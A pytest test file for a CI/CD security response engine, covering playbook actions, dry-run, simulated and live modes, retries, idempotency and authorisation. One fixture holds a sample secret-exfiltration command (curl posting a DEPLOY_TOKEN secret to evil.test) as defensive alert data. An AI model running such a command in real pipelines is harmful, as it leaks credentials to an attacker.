"""Member 2 — response engine: action selection, modes, idempotency, failures and authorisation."""

from unittest.mock import patch
from uuid import uuid4

import httpx
import pytest
from sqlalchemy import func, select

from response import actions, engine, playbook, worker
from response.actions import GitHubActionsClient
from shared import config
from shared.database import record_to_alert
from shared.models import AlertRecord, ContainmentRecord, ResponseActionRecord
from tests.m2_factories import alert, incident, memory_session_factory, scenario07


def no_sleep(_):
    pass


def github(status_code: int, calls: list | None = None) -> GitHubActionsClient:
    def handler(request):
        if calls is not None:
            calls.append(request)
        return httpx.Response(status_code, json={})
    return GitHubActionsClient(token="test-token", repository="org/repo", api_url="https://github.test",
                               transport=httpx.MockTransport(handler))


@pytest.fixture
def session():
    s = memory_session_factory()()
    yield s
    s.close()


@pytest.fixture
def live_config():
    with patch.object(config, "RESPONSE_LIVE_ENABLED", True), \
         patch.object(config, "RESPONSE_API_TOKEN", "s3cret"), \
         patch.object(config, "RESPONSE_LIVE_ACTIONS", ["cancel_pipeline"]):
        yield


def count_actions(session) -> int:
    return session.scalar(select(func.count()).select_from(ResponseActionRecord))


# --- action selection ---------------------------------------------------------------------------


class TestPlaybook:

    def test_unsigned_image_is_blocked(self):
        a = alert("r1", "static", "high", "IMG-001", image="ghcr.io/org/app:latest")
        assert [(p.action, p.target) for p in playbook.plan(a)] == [("block_image", "ghcr.io/org/app:latest")]

    def test_typosquat_dependency_is_blocked(self):
        a = alert("r1", "static", "high", "DEP-001", package="reqeusts", manifest="requirements.txt")
        assert [(p.action, p.target) for p in playbook.plan(a)] == [("block_dependency", "reqeusts")]

    def test_runtime_shell_quarantines_runner_and_cancels_run(self):
        a = alert("r1", "runtime", "critical", "RT-SHELL", hostname="runner-7")
        assert {(p.action, p.target) for p in playbook.plan(a)} == {
            ("quarantine_runner", "runner-7"), ("cancel_pipeline", "r1")}

    def test_secret_exfiltration_revokes_the_named_secrets(self):
        a = alert("r1", "static", "critical", "SEC-002",
                  snippet='curl -d "${{ secrets.DEPLOY_TOKEN }}" https://evil.test')
        assert {(p.action, p.target) for p in playbook.plan(a)} == {
            ("revoke_credential", "DEPLOY_TOKEN"), ("cancel_pipeline", "r1")}

    def test_medium_and_unmapped_alerts_get_no_automated_action(self):
        assert playbook.plan(alert("r1", "static", "med", "IMG-003", image="x")) == []
        assert playbook.plan(alert("r1", "static", "high", "PIN-001")) == []

    def test_rollup_plans_the_union_of_children_without_duplicates(self, session):
        rollup = record_to_alert(scenario07(session))
        children = engine.load_children(session, rollup)
        planned = playbook.plan(rollup, children)
        pairs = [(p.action, p.target) for p in planned]
        assert len(pairs) == len(set(pairs))
        assert ("cancel_pipeline", rollup.run_id) in pairs
        assert ("quarantine_runner", "runner-7") in pairs
        # every action points back to the alert whose evidence justified it
        assert {p.trigger_alert_id for p in planned} <= {rollup.id, *(c.id for c in children)}

    def test_low_severity_rollup_gets_no_actions(self):
        rollup = alert("r1", "correlation", "med", "CORR")
        assert playbook.plan(rollup, [alert("r1", "static", "high", "IMG-001", image="x")]) == []


# --- modes --------------------------------------------------------------------------------------


class TestModes:

    def test_dry_run_records_plan_and_changes_nothing(self, session):
        rollup = scenario07(session)
        result = engine.respond(session, rollup.id, mode="dry_run")
        session.commit()
        assert result["outcome"] == "planned"
        assert {a["status"] for a in result["actions"]} == {"planned"}
        assert all(a["simulated"] and "nothing was executed" in a["result"]["effect"] for a in result["actions"])
        assert session.get(AlertRecord, rollup.id).status == "new"
        assert session.scalar(select(func.count()).select_from(ContainmentRecord)) == 0

    def test_simulated_contains_and_marks_incident_and_children_handled(self, session):
        rollup = scenario07(session)
        result = engine.respond(session, rollup.id, mode="simulated")
        session.commit()
        assert result["outcome"] == "contained"
        assert {a["status"] for a in result["actions"]} == {"succeeded"}
        containments = session.scalars(select(ContainmentRecord)).all()
        assert {(c.kind, c.state) for c in containments} == {("pipeline", "cancelled"), ("runner", "quarantined")}
        assert all(c.simulated and c.incident_id == rollup.id for c in containments)
        statuses = session.scalars(select(AlertRecord.status).where(AlertRecord.run_id == rollup.run_id)).all()
        assert set(statuses) == {"handled"}

    def test_simulated_effect_says_no_external_system_changed(self, session):
        rollup = scenario07(session)
        result = engine.respond(session, rollup.id, mode="simulated")
        assert all("no external system was changed" in a["result"]["effect"] for a in result["actions"])

    def test_no_action_alert_is_left_for_triage(self, session):
        record = incident(session, alert("run-x", "static", "high", "PIN-001"))
        result = engine.respond(session, record.id, mode="simulated")
        assert result["outcome"] == "no_action" and result["actions"] == []
        assert session.get(AlertRecord, record.id).status == "new"

    def test_unknown_mode_and_alert_rejected(self, session):
        with pytest.raises(ValueError):
            engine.respond(session, "x", mode="yolo")
        with pytest.raises(engine.AlertNotFound):
            engine.respond(session, "missing", mode="dry_run")


# --- duplicates ---------------------------------------------------------------------------------


class TestDuplicates:

    def test_processing_the_same_alert_twice_executes_once(self, session):
        rollup = scenario07(session)
        first = engine.respond(session, rollup.id, mode="simulated")
        session.commit()
        before = count_actions(session)
        second = engine.respond(session, rollup.id, mode="simulated")
        session.commit()
        assert count_actions(session) == before
        assert all(a["duplicate"] for a in second["actions"])
        assert [a["id"] for a in first["actions"]] == [a["id"] for a in second["actions"]]
        assert all(a["attempts"] == 1 for a in second["actions"])

    def test_dry_run_then_simulated_are_separate_records(self, session):
        rollup = scenario07(session)
        planned = engine.respond(session, rollup.id, mode="dry_run")
        executed = engine.respond(session, rollup.id, mode="simulated")
        assert len(planned["actions"]) == len(executed["actions"])
        assert count_actions(session) == 2 * len(planned["actions"])


# --- failures and retries -----------------------------------------------------------------------


class TestFailures:

    def test_retry_safe_action_retried_then_failed(self, session, live_config):
        rollup = incident(session, alert("12345", "static", "critical", "PPE-001"))
        calls = []
        result = engine.respond(session, rollup.id, mode="live", token="s3cret", sleep=no_sleep,
                                github=github(503, calls))
        action = next(a for a in result["actions"] if a["action"] == "cancel_pipeline")
        assert action["status"] == "failed" and action["attempts"] == config.RESPONSE_MAX_ATTEMPTS
        assert len(calls) == config.RESPONSE_MAX_ATTEMPTS
        assert result["outcome"] == "incomplete"
        assert session.get(AlertRecord, rollup.id).status == "new"

    def test_permanent_error_not_retried(self, session, live_config):
        rollup = incident(session, alert("12345", "static", "critical", "PPE-001"))
        calls = []
        result = engine.respond(session, rollup.id, mode="live", token="s3cret", sleep=no_sleep,
                                github=github(404, calls))
        assert result["actions"][0]["status"] == "failed" and len(calls) == 1
        assert "404" in result["actions"][0]["error"]

    def test_non_retry_safe_action_is_never_retried(self, session):
        rollup = incident(session, alert("run-c", "static", "critical", "SEC-001"))
        with patch.object(actions, "execute_simulated", side_effect=actions.TransientActionError("idp timeout")):
            first = engine.respond(session, rollup.id, mode="simulated", sleep=no_sleep)
            revoke = next(a for a in first["actions"] if a["action"] == "revoke_credential")
            assert revoke["status"] == "failed" and revoke["attempts"] == 1
            second = engine.respond(session, rollup.id, mode="simulated", sleep=no_sleep)
        again = next(a for a in second["actions"] if a["action"] == "revoke_credential")
        assert again["duplicate"] and again["attempts"] == 1

    def test_failed_retry_safe_action_retried_on_next_processing(self, session):
        rollup = incident(session, alert("run-d", "static", "high", "IMG-001", image="registry:5000/a:1"))
        with patch.object(actions, "execute_simulated", side_effect=actions.ActionError("db busy")):
            assert engine.respond(session, rollup.id, mode="simulated")["actions"][0]["status"] == "failed"
        result = engine.respond(session, rollup.id, mode="simulated")
        assert result["actions"][0]["status"] == "succeeded" and result["actions"][0]["attempts"] == 2
        assert result["outcome"] == "contained"

    def test_non_numeric_run_id_cannot_be_cancelled_live(self, session, live_config):
        rollup = incident(session, alert("attack-01-abc", "static", "critical", "PPE-001"))
        result = engine.respond(session, rollup.id, mode="live", token="s3cret", github=github(202))
        assert result["actions"][0]["status"] == "failed"
        assert "not a numeric GitHub Actions run id" in result["actions"][0]["error"]


# --- authorisation ------------------------------------------------------------------------------


class TestAuthorisation:

    def test_live_disabled_by_default_is_rejected_and_audited(self, session):
        rollup = scenario07(session)
        calls = []
        result = engine.respond(session, rollup.id, mode="live", token="anything", github=github(202, calls))
        assert result["outcome"] == "rejected" and "disabled" in result["detail"]
        assert {a["status"] for a in result["actions"]} == {"rejected"}
        assert calls == []
        assert session.scalar(select(func.count()).select_from(ContainmentRecord)) == 0

    def test_wrong_or_missing_token_rejected(self, session, live_config):
        rollup = scenario07(session)
        for token in (None, "wrong"):
            result = engine.respond(session, rollup.id, mode="live", requested_by="api", token=token,
                                    github=github(202))
            assert result["outcome"] == "rejected"

    def test_authorised_live_cancel_calls_github_and_records_real_containment(self, session, live_config):
        rollup = incident(session, alert("987654", "static", "critical", "PPE-001"))
        calls = []
        result = engine.respond(session, rollup.id, mode="live", requested_by="api", token="s3cret",
                                github=github(202, calls))
        assert result["outcome"] == "contained"
        assert calls[0].url.path == "/repos/org/repo/actions/runs/987654/cancel"
        assert calls[0].headers["Authorization"] == "Bearer test-token"
        assert result["actions"][0]["simulated"] is False
        containment = session.scalars(select(ContainmentRecord)).one()
        assert containment.simulated is False and containment.state == "cancelled"

    def test_actions_without_live_integration_are_rejected_not_faked(self, session, live_config):
        rollup = scenario07(session)
        with patch.object(config, "RESPONSE_LIVE_ACTIONS", ["cancel_pipeline", "quarantine_runner"]):
            result = engine.respond(session, rollup.id, mode="live", token="s3cret", github=github(202))
        quarantine = next(a for a in result["actions"] if a["action"] == "quarantine_runner")
        assert quarantine["status"] == "rejected" and "no live integration" in quarantine["error"]
        assert result["outcome"] != "contained"

    def test_responder_needs_only_server_configuration(self, session):
        with patch.object(config, "RESPONSE_LIVE_ENABLED", True), patch.object(config, "RESPONSE_API_TOKEN", ""):
            engine.check_live_authorization(None, "responder")
            with pytest.raises(engine.LiveNotAuthorized):
                engine.check_live_authorization(None, "api")


# --- responder loop -----------------------------------------------------------------------------


class TestResponder:

    def test_only_new_high_scoring_rollups_are_eligible(self, session):
        rollup = scenario07(session)
        handled = scenario07(session)
        handled.status = "handled"
        # one high alert scores 70 and rolls up; with the threshold raised it is no longer eligible
        single = incident(session, alert(f"one-{uuid4().hex[:4]}", "static", "high", "IMG-001", image="x"))
        session.commit()
        assert set(engine.eligible_alert_ids(session)) == {rollup.id, single.id}
        with patch.object(config, "RESPONSE_MIN_SCORE", 80):
            assert engine.eligible_alert_ids(session) == [rollup.id]
        assert not set(rollup.evidence["child_alert_ids"]) & set(engine.eligible_alert_ids(session))

    def test_run_once_responds_in_configured_mode(self):
        factory = memory_session_factory()
        with factory() as s:
            rollup_id = scenario07(s).id
        with patch.object(config, "RESPONSE_MODE", "simulated"):
            results = worker.run_once(factory)
        assert [r["outcome"] for r in results] == ["contained"]
        with factory() as s:
            assert s.get(AlertRecord, rollup_id).status == "handled"
            assert worker.run_once(factory) == []  # handled incidents are no longer eligible
